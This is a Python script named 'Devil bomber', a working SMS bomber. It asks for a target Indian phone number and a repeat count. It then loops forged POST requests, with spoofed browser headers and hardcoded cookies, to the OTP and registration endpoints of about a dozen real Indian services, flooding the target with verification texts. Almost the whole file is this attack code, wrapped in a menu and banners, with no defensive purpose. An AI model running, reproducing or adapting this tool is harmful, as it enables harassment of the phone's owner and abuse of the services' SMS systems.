
#===========================================||
#================PROJECT INFO===============||
#===========================================||
#==== Auther : SM02 PresenT ================||
#==== Start Date : 10/12/2023 ==============||
#==== Version : 2.0 BETA ===================||
#==== About :  Sms  bomber =================||
#==== Requremnts : fake_useragent,requests =||
#==== Note : Do Not Copy This Code , =======||
#===========================================||
#================END INFO===================||
#===========================================||

license = '''
MIT License
Copyright (c) 2020 - 2023 The  SM02

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE. 
         if You Have Any Problem Contact Me On telegram : simplehacker1
         
  
'''
print(license)

import requests , json ,time
from fake_useragent import UserAgent
ua = UserAgent()


myip = requests.get('https://www.wikipedia.org').headers['X-Client-IP']

def logo():

    print("\033[31m")
   
    print("██████╗░███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░")
    print("██╔══██╗██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗")
    print("██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝")
    print("██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗")
    print("██████╔╝███████╗░░╚██╔╝░░██║███████╗  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║")
    print("╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝")
    print(" Your IP is : " +myip)
    print(" \033[33m  Devil bomber  \n")


def smsm(number, repeat):

    repeat  = int(repeat)

    UG = ua.chrome
    for i in  range(repeat):
        number  = str(number)
        headers = {
            'Host': 'auth.udaan.com',
            'content-length': '17',
            'x-app-id': 'udaan-auth',
            'traceparent': '00-94a6e0bccbb332c53f129ca9ef6e71b8-adcc060214b06b40-00',
            'accept-language': 'en-IN',
            'user-agent': UG,
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'accept': '*/*',
            'origin': 'https://auth.udaan.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2',
            'accept-encoding': 'gzip, deflate, br',
            'cookie': 'sid=VwCKAOdskvwBAMG2xSZrbZL8vd99bdRvTMx/Z/YD4NhfjkbIZf2IzF7TQ902OazS9KIv2orueg81btncDxMM1rbq',
        }

        params = (
            ('client_id', 'udaan-v2'),
        )

        data = {
        'mobile': number
        }

        response = requests.post('https://auth.udaan.com/api/otp/send', headers=headers, params=params, data=data);pass

    
        headers = {
            'Host': 'udaan.com',
            'content-length': '29',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': UG,
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://udaan.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://udaan.com/login',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
            'cookie': 's=1kj2b02sprzis1rfarco1px4we',
        }

        params = (
            ('cmd', 'send'),
        )

        data = {
        'try_count': '0',
        'mobile': number
        }

        response = requests.post('https://udaan.com/login', headers=headers, params=params, data=data);pass


        


        headers = {
            'Host': 'api.penpencil.co',
            'content-length': '75',
            'client-version': '2.4.13',
            'user-agent': UG,
            'content-type': 'application/json',
            'accept': 'application/json, text/plain, */*',
            'randomid': 'f518c78d-f241-4db0-a891-9f6524c710b4',
            'client-id': '5eb393ee95fab7468a79d189',
            'client-type': 'WEB',
            'origin': 'https://www.pw.live',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.pw.live/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"mobile": "1234", "countryCode": "+91", "firstName": "Sss", "lastName": ""}'
        data =  data.replace('1234',str(number))
        # data = json.loa/ds(data);pass
        response = requests.post('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189', headers=headers, data=data);pass

        



        headers = {
            'Host': 'api.penpencil.co',
            'content-length': '75',
            'client-version': '2.4.13',
            'user-agent': UG,
            'content-type': 'application/json',
            'accept': 'application/json, text/plain, */*',
            'randomid': 'f518c78d-f241-4db0-a891-9f6524c710b4',
            'client-id': '5eb393ee95fab7468a79d189',
            'client-type': 'WEB',
            'origin': 'https://www.pw.live',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.pw.live/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"mobile":"'+number+'","countryCode":"+91","firstName":"Sss","lastName":""}'

        response = requests.post('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189', headers=headers, data=data);pass


        headers = {
            'Host': 'api.toolsvilla.com',
            'content-length': '66',
            'accept': 'application/json, text/plain, */*',
            'pageurl': '/?gad_source=1&gclid=EAIaIQobChMIqLni4dvuggMVfyR7Bx0LXQcaEAAYASAAEgJY3PD_BwE',
            'user-agent': UG,
            'content-type': 'application/json',
            'origin': 'https://www.toolsvilla.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.toolsvilla.com/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"firstname":"","mobileno":"'+number+'","email":"","wtpSubs":"true"}'

        response = requests.post('https://api.toolsvilla.com/web/register', headers=headers, data=data);pass



        headers = {
            'Host': 'goplus.in',
            'Connection': 'keep-alive',
            'Content-Length': '67',
            'deviceId': 'abc',
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'Content-Type': 'application/json;charset=UTF-8',
            'Accept': 'application/json',
            'deviceVersion': '0',
            'platform': 'ANDROID',
            'appVersion': 'v1.0',
            'Origin': 'https://mobile.shuttltech.com',
            'X-Requested-With': 'pure.lite.browser',
            'Sec-Fetch-Site': 'cross-site',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://mobile.shuttltech.com/',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"phoneNumber":"'+number+'","newDevice":"false","policyPerused":true}'

        response = requests.post('https://goplus.in/v3/auth/user/otp', headers=headers, data=data);pass

        headers = {
            'Host': 'api.cureskin.com',
            'content-length': '299',
            'baggage': 'sentry-environment=production,sentry-release=app%402.0.462,sentry-public_key=f50a2ba984c66e974c85651f3672ff35,sentry-trace_id=6c8710e4d4ae4b8c9d4386cb86768fc3',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'sentry-trace': '6c8710e4d4ae4b8c9d4386cb86768fc3-93f53738ec36fd4f-0',
            'content-type': 'text/plain',
            'accept': '*/*',
            'origin': 'https://app.cureskin.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://app.cureskin.com/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"mobileNumber":"'+number+'","deviceId":"f63754ef4d120ddb59d4","source":"web","time":"2023-12-01T16:29:33.767Z","digest":"ce95fea5ec919a57325732a7fbdec2d75232ec27a95ecc28f7bf7e04e70e55f6","_ApplicationId":"myAppId","_ClientVersion":"js3.4.4","_InstallationId":"12d7f289-c92d-4ce8-9e77-ad3bf4deaf8f"}'

        response = requests.post('https://api.cureskin.com/api/parse/functions/requestOTP', headers=headers, data=data);pass

        headers = {
            'Host': 'loginprod.medibuddy.in',
            'content-length': '202',
            'accept': 'application/json, text/plain, */*',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'content-type': 'application/json',
            'origin': 'https://www.medibuddy.in',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.medibuddy.in/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"'+number+'","flow":"Retail-Login-Home-Flow","idealLoginFlow":false,"advertiserId":"8f191ec6-b5c8-Ld51-830f-65892ff7fb13","mbUserId":null}'

        response = requests.post('https://loginprod.medibuddy.in/unified-login/user/register', headers=headers, data=data);pass

        headers = {
            'Host': 'unacademy.com',
            'content-length': '107',
            'x-platform': '7',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://unacademy.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://unacademy.com/login?redirectTo=%2Fsettings',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
            'cookie': 'anonymous_session_id=aae2b19d_5c59_44ba_aa88_f50a8b49ffd5',
        }

        params = (
            ('enable-email', 'true'),
        )

        data = '{"phone":"'+number+'","country_code":"IN","otp_type":1,"email":"","send_otp":"true","is_un_teach_user":false}'

        response = requests.post('https://unacademy.com/api/v3/user/user_check/', headers=headers, params=params, data=data);pass





        cookies = {
            'cookie:campaignCookienew': '{"utm_medium":"bfl","utm_campaign":NA,"utm_keyword":NA,"utm_content":NA,"utm_source":"organic_myaccount"}',
        }

        headers = {
            'Host': 'www.bajajfinserv.in',
            'content-length': '136',
            'tracestate': '2442591@nr=0-1-2364187-1120225423-a1676216f73520a0----1701447794700',
            'traceparent': '00-53e72ff78740605b404c2a4ce9009e00-a1676216f73520a0-01',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIzNjQxODciLCJhcCI6IjExMjAyMjU0MjMiLCJpZCI6ImExNjc2MjE2ZjczNTIwYTAiLCJ0ciI6IjUzZTcyZmY3ODc0MDYwNWI0MDRjMmE0Y2U5MDA5ZTAwIiwidGkiOjE3MDE0NDc3OTQ3MDAsInRrIjoiMjQ0MjU5MSJ9fQ==',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept': '*/*',
            'x-requested-with': 'XMLHttpRequest',
            'request-id': '|0f55808691fe4f568fde7ae869c35b20.a2f8bbb358924c93',
            'origin': 'https://www.bajajfinserv.in',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.bajajfinserv.in/myaccountlogin/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
            'cookie': 'kampyleSessionPageCounter=1',
        }

        data = {
        'CLType': 'INDIVIDUAL',
        'Mobile_Email': number,
        'DOB': '',
        'Pan_No': '',
        'IP': '',
        'Device': '',
        'Device_Info': '',
        'Browser_Type': 'Safari',
        'Source': 'Login',
        'LoginType': '1',
        'EventClick': ''
        }

        response = requests.post('https://www.bajajfinserv.in/MyAccountLogin/Login/GetOTP', headers=headers, cookies=cookies, data=data);pass



        headers = {
            'Host': 'www.my11circle.com',
            'content-length': '123',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://www.my11circle.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.my11circle.com/player/login.html',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
            'cookie': 'ga24x7_pixeltracker=from_page%3Dlogin.html%26referrer_url%3D',
        }
        data = '{"mobile":"'+number+'","deviceId":"03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1","deviceName":"","refCode":"","isPlaycircle":false}'
        response = requests.post('https://www.my11circle.com/api/fl/auth/v3/getOtp', headers=headers, data=data);pass

        headers = {
            'Host': 'www.rummycircle.com',
            'content-length': '123',
            'cache-control': 'max-age=0',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'content-type': 'application/json',
            'accept': '*/*',
            'origin': 'https://www.rummycircle.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.rummycircle.com/loginnow.html',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
            'cookie': 'AWSALBCORS=1tS0LdJM+fFwf4IHgfQpZbU6wVU1Rd6+xr7qaWCxlF1jYyVHAvY2I2Fua8JNR5whrvS/xBuubwutIJi+o4mDObqaVQKCCTZ99oMcFQSLtfGniKBTsRwSYvbBa8af',
        }

        data = '{"mobile":"'+number+'","deviceId":"6ebd671c-a5f7-4baa-904b-89d4f898ee79","deviceName":"","refCode":"","isPlaycircle":false}'

        response = requests.post('https://www.rummycircle.com/api/fl/auth/v3/getOtp', headers=headers, data=data);pass

        headers = {
            'Host': 'api.khelbro.com',
            'content-length': '42',
            'accept': 'application/json, text/plain, */*',
            'x-auth-token': 'undefined',
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
            'content-type': 'application/json',
            'origin': 'https://khelbro.com',
            'x-requested-with': 'pure.lite.browser',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://khelbro.com/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
        }

        data = '{"mobile":"1234456","retryType":"text"}'
        data =  data.replace("1234456",str(number))

        response = requests.post('https://api.khelbro.com/api/v2/auth/resendOtp', headers=headers, data=data)

    print('\nBoombing done\n')
    auther()


def spam():

    try:
        number = int(input("\nEnter target No : +91"))
        smss = int(input("\nEnter how many times to repeat: "))
        if len(str(number)) == 10:
            print(smss)
            if smss > 0:  
                print("\nBombing Started\nCtrl + C to close")
                smsm(number=number,repeat=smss)
            else:
                print("\nBombing Started\nCtrl + C to close")
                smsm(number=number,repeat='1')
            
        else:
            print("Input should be exactly 10 digit.")
            time.sleep(1)
            spam()
    
        
    except ValueError:
        print("Please enter valid integer inputs.")
        time.sleep(1)
        spam()
   

def auther():
    print("██████╗░███████╗██╗░░░██╗██╗██╗░░░░░  ██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░")
    print("██╔══██╗██╔════╝██║░░░██║██║██║░░░░░  ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗")
    print("██║░░██║█████╗░░╚██╗░██╔╝██║██║░░░░░  ██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝")
    print("██║░░██║██╔══╝░░░╚████╔╝░██║██║░░░░░  ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗")
    print("██████╔╝███████╗░░╚██╔╝░░██║███████╗  ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║")
    print("╚═════╝░╚══════╝░░░╚═╝░░░╚═╝╚══════╝  ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝")
   
    print("\033[31m   SM02 PRESENT \n")
    print("\n")
    time.sleep(1)
    exit

def menu():
    logo()
    print("\033[31m    ╔════════════════╗")
    print("\033[31m    ║✧ 1\033[32m mix bomb    \033[31m║")
    print("\033[31m    ║✧ 2\033[32m update      \033[31m║")
    print("\033[31m    ║✧ 3\033[32m Auther      \033[31m║")
    print("\033[31m    ╚✧ 4\033[32m Exit       \033[31m✧╝") 
    number = input("    \nEnter Your Choice : ")
    if(number=="1"):
        time.sleep(1)
        spam()
    elif(number=="2"):
        print("\033[31m commin soon\033[31m")
        time.sleep(1)
        menu()
        # costom_spam()
    
    elif(number=="3"):
        auther()
    elif(number=="4"):
        logo()
        print("Thanks For using My tool")
        exit()
    else:
        print("\n Please choice in 1 to 6")
        time.sleep(1)
        menu()


if __name__=="__main__":
    menu()
 


